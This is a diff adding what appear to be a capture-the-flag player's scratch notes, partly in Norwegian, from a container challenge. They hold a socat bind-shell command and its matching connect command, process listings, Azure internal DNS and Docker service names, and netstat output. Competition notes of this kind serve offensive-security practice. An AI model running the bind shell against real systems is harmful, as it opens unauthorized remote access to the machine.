@@ -1,0 +1,39 @@
+bind-shell: 
+socat TCP-LISTEN:2222,reuseaddr,fork EXEC:ash,pty,stderr,setsid,sigint,sane
+
+connect to bind shell:
+socat FILE:`tty`,raw,echo=0 TCP:10.0.119.125:2222
+
+
+kjøres på milk:
+  241     0 root     R     407m  21%   0   0% {runc:[2:INIT]} runc init
+
+init:
+  lrwxrwxrwx    1 root     root            12 Oct 13  2016 init -> /bin/busybox
+
+
+  nameserver: search ukn1bxm3pmgu3lqwllnij4mazb.oslx.internal.cloudapp.net
+  127.0.0.11
+
+  azure internal network
+  vmname: ukn1bxm3pmgu3lqwllnij4mazb
+
+c2885919f5ff39fc813b091f199f0a37_cloud-c2-70.		1.		7cj63gz2ob7uo041eojwehybo.		c2885919f5ff39fc813b091f199f0a37_backend
+c2885919f5ff39fc813b091f199f0a37_corax.				1.      rnm7wr5u5lojrq135eth76kp6.      c2885919f5ff39fc813b091f199f0a37_backend
+c2885919f5ff39fc813b091f199f0a37_cloud-hq-42.		1.		n6lxxunf3qs6eeini2aw4dpga.      c2885919f5ff39fc813b091f199f0a37_backend
+c2885919f5ff39fc813b091f199f0a37_keystore.			1.		wczbikzw7t2pbrr7qlhzy3w4z.		c2885919f5ff39fc813b091f199f0a37_backend
+c2885919f5ff39fc813b091f199f0a37_scoreboard-proxy.	1.		z3rhowf39tetwl00sffh5skw2.		c2885919f5ff39fc813b091f199f0a37_backend
+
+c2885919f5ff39fc813b091f199f0a37=userhash/namespace?					dockernames?
+
+starte ny container som relay?
+endre dockerfile, legge til: EXPOSE 1234
+
+netstat
+tcp        0      0 localhost:35477         localhost:1337          TIME_WAIT
+...
+tcp        0      0 localhost:46805         localhost:1337          TIME_WAIT
+...
+tcp        0      0 localhost:34789         localhost:1337          TIME_WAIT
+...
+tcp        0      0 localhost:34073         localhost:1337          TIME_WAIT
